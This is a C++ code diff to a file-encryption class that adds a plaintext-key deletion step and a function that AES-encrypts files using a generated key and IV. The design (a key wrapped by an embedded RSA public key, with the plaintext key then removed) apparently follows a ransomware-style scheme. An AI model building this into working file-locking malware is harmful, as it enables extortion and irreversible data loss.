@@ -11,7 +11,7 @@ Encryptor::Encryptor(int keySize) : _keySize(keySize), _rsaEncryptorAESKey(new r
                                                        _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                                        _aesEncryptor(new aes::AESEncryptor())
 {
-
+    LOG_TRACE("Create class Encryptor");
 }
 
 Encryptor::~Encryptor()
@@ -55,9 +55,38 @@ void Encryptor::encryptAESKeyFile(const std::string &filepath)
         // save the encrypted AES Keys to AESKey.bin
         _rsaEncryptorAESKey->saveEncryptedKeyFile(AES_KEY_ENC_FILENAME, aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());
 
+        // delete AESKey.txt file
+        butterfly::removeFile(filepath);
+
     } catch (RSAEncryptionException &e)
     {
         LOG_ERROR(e.what());
+    }
+
+}
+
+void Encryptor::encryptFileWithAES(const std::string &filepath)
+{
+    if ( _aesEncryptor->generateAESKey() )
+    {
+        // replace with sql handling
+        std::string aeskey = _aesEncryptor->getAESKey();
+        std::string aesiv = _aesEncryptor->getAESIv();
+        butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
+        butterfly::writeBinFile("AESIv.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
+
+        try
+        {
+            _aesEncryptor->encryptFile(filepath);
+
+        } catch (AESEncryptionException &e)
+        {
+            LOG_ERROR(e.what());
+        }
+
+    } else
+    {
+        LOG_ERROR("Could not generate the AES Key!")
     }
 
 }
